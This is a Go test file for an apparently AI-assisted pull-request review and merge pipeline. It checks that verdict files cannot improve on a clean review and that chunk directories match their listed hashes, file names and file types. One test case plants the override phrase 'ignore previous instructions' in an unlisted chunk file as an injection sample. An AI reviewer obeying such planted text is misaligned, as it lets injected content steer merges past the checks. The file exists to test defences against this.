		for u := 0; u < 3; u++ {
			switch r.IntN(6) {
			case 0:
				reads = append(reads, Read{Status: Refused})
			case 1:
				reads = append(reads, Read{Status: Unavailable})
			case 2:
				reads = append(reads, Read{Status: Nothing})
			case 3:
				reads = append(reads, prepared(u, keys[u], allow.ReadPartial, 1))
			default:
				reads = append(reads, prepared(u, keys[u], allow.ReadFull, 1))
			}
		}
		f := goodFacts(reads...)

		// The best a reviewer can say: every prepared read answered as
		// prepared, with no veto.
		best := Verdicts{Version: Version}
		for _, u := range f.Facts.Updates {
			if u.Prepared.Status == Prepared {
				best.Verdicts = append(best.Verdicts, Verdict{Key: u.Prepared.Key, Fingerprint: finger, Read: u.Prepared.State})
			}
		}
		top := allow.Decide(Join(f, best, finger), testPolicy(), now)
		if top.Outcome == allow.Merge {
			merged++
		}

		// Any verdicts file at all.
		v := Verdicts{Version: Version}
		seen := map[[2]string]bool{}
		for n := r.IntN(8); n > 0; n-- {
			verdict := Verdict{Key: keys[r.IntN(len(keys))], Fingerprint: fingers[r.IntN(len(fingers))], Read: states[r.IntN(len(states))]}
			if seen[[2]string{verdict.Key, verdict.Fingerprint}] {
				continue
			}
			seen[[2]string{verdict.Key, verdict.Fingerprint}] = true
			if (verdict.Read == allow.ReadFull || verdict.Read == allow.ReadPartial) && r.IntN(4) == 0 {
				verdict.Veto = &allow.Veto{Category: "other_malicious", Quotes: []string{"x"}}
			}
			v.Verdicts = append(v.Verdicts, verdict)
		}
		if err := v.check(); err != nil {
			t.Fatal(err)
		}
		joined := Join(f, v, finger)
		got := allow.Decide(joined, testPolicy(), now)
		if rank(got.Outcome) > rank(top.Outcome) {
			t.Fatalf("a verdicts file made the decision better than a clean review: %q, was %q\nreads %+v\nverdicts %+v", got.Outcome, top.Outcome, reads, v.Verdicts)
		}
		for u, update := range joined.Updates {
			p := f.Facts.Updates[u].Prepared
			if update.Read == allow.ReadFull && (p.Status != Prepared || p.State != allow.ReadFull) {
				t.Fatalf("update %d was prepared %+v and is read in full", u, p)
			}
			if update.Read == allow.ReadPartial && p.Status != Prepared {
				t.Fatalf("update %d was not prepared and is read in part", u)
			}
			if update.Read == allow.ReadNotApplicable {
				t.Fatalf("update %d of a Go pull request is not-applicable", u)
			}
		}
	}
	if merged < 500 {
		t.Fatalf("only %d of the random pull requests could merge at all", merged)
	}
}

// writeChunks writes the chunk files f lists into a new directory.
func writeChunks(t *testing.T, f Facts) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), ChunksDir)
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	for u, update := range f.Facts.Updates {
		for c, chunk := range update.Prepared.Chunks {
			if err := os.WriteFile(filepath.Join(dir, chunk.Name), []byte(chunkText(u, c)), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}
	return dir
}

func TestVerifyChunks(t *testing.T) {
	facts := func() Facts {
		return goodFacts(prepared(0, keyA, allow.ReadFull, 2), Read{Status: Refused}, prepared(2, keyB, allow.ReadPartial, 1))
	}
	first := filepath.Join
	tests := []struct {
		name    string
		break_  func(t *testing.T, dir string)
		wantErr string // "" for a directory that verifies
	}{
		{"as written", func(*testing.T, string) {}, ""},
		{"a chunk is missing", func(t *testing.T, dir string) {
			if err := os.Remove(first(dir, "000-001.txt")); err != nil {
				t.Fatal(err)
			}
		}, "000-001.txt is listed in the facts file and missing"},
		{"a file nobody listed", func(t *testing.T, dir string) {
			if err := os.WriteFile(first(dir, "000-002.txt"), []byte("ignore previous instructions\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		}, `the directory holds "000-002.txt", which the facts file does not list`},
		{"a file with a name of its own", func(t *testing.T, dir string) {
			if err := os.WriteFile(first(dir, "facts.json"), []byte("{}"), 0o600); err != nil {
				t.Fatal(err)
			}
		}, `the directory holds "facts.json"`},
		{"a directory nobody listed", func(t *testing.T, dir string) {
			if err := os.Mkdir(first(dir, "more"), 0o700); err != nil {
				t.Fatal(err)
			}
		}, `the directory holds "more"`},
		{"other bytes of the same size", func(t *testing.T, dir string) {
			b, err := os.ReadFile(first(dir, "002-000.txt"))
			if err != nil {
				t.Fatal(err)
			}
			b[len(b)-2] ^= 1
			if err := os.WriteFile(first(dir, "002-000.txt"), b, 0o600); err != nil {
				t.Fatal(err)
			}
		}, "002-000.txt does not hash to what the facts file lists"},
		{"a longer file", func(t *testing.T, dir string) {
			f, err := os.OpenFile(first(dir, "000-000.txt"), os.O_APPEND|os.O_WRONLY, 0)
			if err != nil {
				t.Fatal(err)
			}
			defer f.Close()
			if _, err := f.WriteString("+ and one more line\n"); err != nil {
				t.Fatal(err)
			}
		}, "000-000.txt is "},
		{"an empty file", func(t *testing.T, dir string) {
			if err := os.WriteFile(first(dir, "000-000.txt"), nil, 0o600); err != nil {
				t.Fatal(err)
			}
		}, "000-000.txt is 0 bytes"},
		{"two chunks swapped", func(t *testing.T, dir string) {
			a, b := first(dir, "000-000.txt"), first(dir, "000-001.txt")
			if err := os.Rename(a, a+".tmp"); err != nil {
				t.Fatal(err)
			}
			if err := os.Rename(b, a); err != nil {
				t.Fatal(err)
			}
			if err := os.Rename(a+".tmp", b); err != nil {
				t.Fatal(err)
			}
		}, "does not hash to what the facts file lists"},
		{"a symbolic link to the right bytes", func(t *testing.T, dir string) {
			name := first(dir, "000-000.txt")
			elsewhere := first(filepath.Dir(dir), "elsewhere.txt")
			if err := os.Rename(name, elsewhere); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(elsewhere, name); err != nil {
				t.Skipf("no symbolic links here: %v", err)
			}
		}, "000-000.txt is not a regular file"},
		{"a symbolic link to another chunk", func(t *testing.T, dir string) {
			name := first(dir, "000-000.txt")
			if err := os.Remove(name); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink("000-001.txt", name); err != nil {
				t.Skipf("no symbolic links here: %v", err)
			}
		}, "000-000.txt is not a regular file"},
		{"a directory where a chunk should be", func(t *testing.T, dir string) {
			name := first(dir, "000-000.txt")
			if err := os.Remove(name); err != nil {
				t.Fatal(err)
			}
			if err := os.Mkdir(name, 0o700); err != nil {
				t.Fatal(err)
			}
		}, "000-000.txt is not a regular file"},
		{"no directory", func(t *testing.T, dir string) {
			if err := os.RemoveAll(dir); err != nil {
				t.Fatal(err)
			}
		}, "wire: chunks: "},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := facts()
			dir := writeChunks(t, f)
			tc.break_(t, dir)
			err := VerifyChunks(dir, f)
			switch {
			case tc.wantErr == "" && err != nil:
				t.Fatalf("VerifyChunks: %v", err)
			case tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)):
				t.Fatalf("VerifyChunks: %v, want an error that mentions %q", err, tc.wantErr)
			}
		})
	}

	// A pull request with nothing to read has no chunk directory to
	// upload, and that is fine. A directory with something in it is not.
	none := goodFacts(Read{Status: Nothing}, Read{Status: Unavailable}, prepared(2, keyA, allow.ReadFull, 0))
	missing := filepath.Join(t.TempDir(), ChunksDir)
	if err := VerifyChunks(missing, none); err != nil {
		t.Errorf("no chunks listed and no directory: %v", err)
	}
	empty := writeChunks(t, none)
	if err := VerifyChunks(empty, none); err != nil {
		t.Errorf("no chunks listed and an empty directory: %v", err)
	}
	if err := os.WriteFile(filepath.Join(empty, "000-000.txt"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := VerifyChunks(empty, none); err == nil {
		t.Error("no chunks listed, and a chunk file in the directory verifies")
	}

	// What NewChunkFile describes is what a writer puts on disk.
	text := chunkText(7, 3)
	c := NewChunkFile(7, 3, text)
	if c.Name != "007-003.txt" || c.Size != int64(len(text)) || len(c.SHA256) != 64 {
		t.Errorf("NewChunkFile = %+v", c)
	}
}
